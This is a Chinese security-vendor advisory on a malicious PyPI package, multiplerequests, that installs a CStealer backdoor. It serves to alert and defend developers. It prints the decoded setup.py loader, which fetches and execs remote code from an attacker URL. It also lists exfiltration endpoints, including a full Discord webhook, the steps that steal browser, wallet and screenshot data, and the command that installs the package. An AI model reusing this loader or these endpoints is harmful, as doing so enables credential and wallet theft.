---
title: 供应链投毒预警：恶意Py包伪装HTTP组件开展CStealer窃密后门攻击
url: https://www.4hou.com/posts/YY22
source: 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com
date: 2024-05-11
fetch_date: 2025-10-06T17:13:49.336353
---

# 供应链投毒预警：恶意Py包伪装HTTP组件开展CStealer窃密后门攻击

供应链投毒预警：恶意Py包伪装HTTP组件开展CStealer窃密后门攻击 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 供应链投毒预警：恶意Py包伪装HTTP组件开展CStealer窃密后门攻击

悬镜安全
[技术](https://www.4hou.com/category/technology)
2024-05-10 17:45:14

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)214455

收藏

导语：悬镜供应链安全情报中心在Pypi官方仓库（https://pypi.org/）中捕获1起CStealer窃密后门投毒事件。

**概述**

近日（2024年4月25号），悬镜供应链安全情报中心在Pypi官方仓库（https://pypi.org/）中捕获1起CStealer窃密后门投毒事件，投毒者连续发布6个不同版本的恶意Py包multiplerequests，目标针对windows平台python开发者，该恶意包在安装时会远程加载CStealer后门到受害者系统上执行，该后门会窃取受害者系统敏感信息、主流浏览器隐私数据、数字货币钱包应用数据以及系统屏幕截屏等。此外，后门还会尝试驻留Windows系统启动目录实现开机自启动。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329214200150.png "1715328836179698.png")

截至目前，恶意Py包multiplerequests在pypi官方仓库上被下载435次。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329214140064.png "1715328849178828.png")

pypi仓库恶意包multiplerequests下载量

该恶意Py包仍可从国内主流Pypi镜像源(清华大学、腾讯云等)下载安装，因此潜在的受害者数量可能会更多。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329215127029.png "1715328869650841.png")

清华镜像源

以国内清华大学镜像源为例，可通过以下命令测试安装该恶意组件包。

pip3 install multiplerequests -i  <https://pypi.tuna.tsinghua.edu.cn/simple>

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329216121879.png "1715328902539932.png")

由于该恶意Py包只针对Windows系统，测试环境使用Linux系统，导致恶意包安装过程中触发恶意代码时触发非预期的Windows系统路径(~\\AppData\\Roaming/frvezdffvvcode.py) 的文件写入操作。

**投毒分析**

以multiplerequests恶意包2.31.0版本为例，当Python开发者使用pip install从Pypi官方仓库或下游镜像源直接安装或依赖引用恶意组件包时，将自动触发执行Python安装包setup.py中经过base64编码的恶意代码。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329217922636.png "1715328966161324.png")

恶意代码base64解码后如下所示，第一阶段恶意代码进一步从投毒者服务器上（[https://frvezdffvv.pythonanywhere.com/getpackage）拉取第二阶段恶意代码并执行。](https://frvezdffvv.pythonanywhere.com/getpackage%EF%BC%89%E6%8B%89%E5%8F%96%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%B9%B6%E6%89%A7%E8%A1%8C%E3%80%82)

```
from urllib import request
package_url = "https://frvezdffvv.pythonanywhere.com/getpackage"
package_name = request.urlopen(package_url).read()
exec(base64.b64decode(package_name))
```

第二阶段恶意代码同样经过base64编码，如下所示：

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329218128158.png "1715328997124243.png")

第二阶段恶意代码(base64编码)

Base64解码后还原出真实的第二阶段恶意代码，如下所示：

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329219399899.png "1715329007763123.png")

第二阶段真实恶意代码

经代码分析后确认该恶意代码是github开源CStleaer后门项目的变种版本（https://github.com/can-kat/cstealer/blob/main/cstealer.py）。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329220127476.png "1715329024367351.png")

CStealer窃密后门项目

该恶意代码主要包括以下功能：

1. 收集系统敏感信息

2. 收集浏览器隐私数据

3. 收集数字钱包应用数据

4. 系统屏幕截屏

5. 开机自启动

**收集系统敏感信息**

通过python内置platform和socket模块获取操作系统版本、处理器、网卡MAC、网络IP地址、主机名等敏感信息，并将数据外传到投毒者webhook接口（https://discord.com/api/webhooks/1233936673201717258/ZkGsTyRGKfqYb2BWGqAjLNYNWZhca-yEVm3gpTYSSvkUV9JRXNQVaTuW4VPr2Jgs9Oot）。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329221211824.png "1715329060149580.png")

系统信息收集功能

**收集浏览器隐私数据**

针对基于chromium内核的主流浏览器（chrome、opera、edge、torch、yandex、epic等）进行用户隐私数据收集，包括cookie、登录凭证、浏览历史数据、下载记录等。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329222203421.png "1715329073197232.png")

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329224670604.png "1715329081987140.png")

浏览器用户隐私数据收集功能

浏览器数据收集后，会被压缩打包发送到投毒者webhook接口

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329225392908.png "1715329100110407.png")

浏览器隐私数据外传功能

**收集数字钱包应用数据**

针对主流数字钱包（Atomic Wallet、Binance、Electrum等）的应用数据进行压缩打包后，利用curl将钱包数据外传到投毒者服务器（https://store1.gofile.io/uploadFile）。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329226125662.png "1715329118382623.png")

数字钱包及其应用数据路径

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329226142779.png "1715329131810668.png")

数字钱包应用数据外传接口

**系统屏幕截屏**

首先从攻击者服务器（https://frvezdffvv.pythonanywhere.com/getmss）下载python mss模块安装包（mss.zip）到目标系统中，并对安装包进行解压。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329227138604.png "1715329148702002.png")

远程下载python mss屏幕截屏模块

python mss是个基于ctypes实现的跨平台屏幕截屏模块，项目源码托管在github上（<https://github.com/BoboTiG/python-mss>）。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329228359216.png "1715329161757525.png")

Python MSS开源项目

如下所示，恶意代码利用python-mss模块获取受害者系统的屏幕截屏后，将截屏数据发送到投毒者webhook接口上。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329229169581.png "1715329174594542.png")

系统屏幕截屏及数据回传

**开机自启动**

该CStealer后门还会将自身恶意代码拷贝到Windows系统启动目录，尝试通过开机自启动实现投毒持久化。

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329230753477.png "1715329200152918.png")

恶意后门写入Windows系统自启动目录

**IoC数据**

此次投毒组件包涉及以下IoC数据：

|  |  |  |
| --- | --- | --- |
| IoC | 类型 | SHA256 |
| multiplerequests-2.31.0/setup.py | 文件 | e6eb8d5f7d451e8833551337c3b775170071935581059c553fa889f046a81c3f |
| https://frvezdffvv.pythonanywhere.com/getpackage | URL |  |
| https://discord.com/api/webhooks/1233936673201717258/ZkGsTyRGKfqYb2BWGqAjLNYNWZhca-yEVm3gpTYSSvkUV9JRXNQVaTuW4VPr2Jgs9Oot | URL |  |
| https://frvezdffvv.pythonanywhere.com/getmss | URL |  |
| https://rentry.co/u4tup/raw | URL |  |
| https://rentry.co/5crcu/raw | URL |  |
| https://rentry.co/5uu99/raw | URL |  |
| https://rentry.co/pmpxa/raw | URL |  |
| https://store1.gofile.io/uploadFile | URL |  |

![image.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20240510/1715329241835579.png "1715329217718691.png")

**排查方式**

截至目前，该Python恶意组件包仍可从国内主流Pypi镜像源正常下载安装，国内Python开发者可根据恶意包信息和IoC数据通过以下方式进行快速排查是否安装或引用恶意组件包。

开发者可通过命令pip show multiplerequests快速排查是否误安装或引用该恶意py组件包，若命令运行结果如下图所示，则代表系统已被安装该恶意组件，请尽快通过命令pip uninstall multiplerequests -y 进行卸载，同时还需关闭系统网络并排查系统是否存在异常进程。

此外，开发者也可使用OpenSCA-cli，将受影响的组件包按如下示例保存为db.json文件，直接执行扫描命令（opensca-cli -db db.json -path ${project\_path}），即可快速获知您的项目是否受到投毒包影响。

```
[
  {
    "product": "multiplerequests",
    "version": "[2.31.0, 2.31.1, 2.31.2, 2.31.3, 2.31.4, 2.31.5]",
    "language": "python",
    "id": "XMIRROR-MAL45-7DF79312",
    "description": "Python恶意组件包multiplerequests开展CStealer窃密后门攻击",
"release_date": "2024-04-25"
}
]
```

悬镜供应链安全情报中心将持续监测全网主流开源软件仓库，对潜在风险的开源组件包进行动态跟踪和溯源，实现快速捕获开源组件投毒攻击事件并第一时间提供精准安全预警。

如若转载，请注明原文地址

* 分享至

![取消](https://www.4hou.com/sihou/images/close.jpg)
![嘶吼](https://www.4hou.com/sihou/images/logo.png)

感谢您的支持，我会继续努力的!

![扫码支持]( "扫一扫")

打开微信扫一扫后...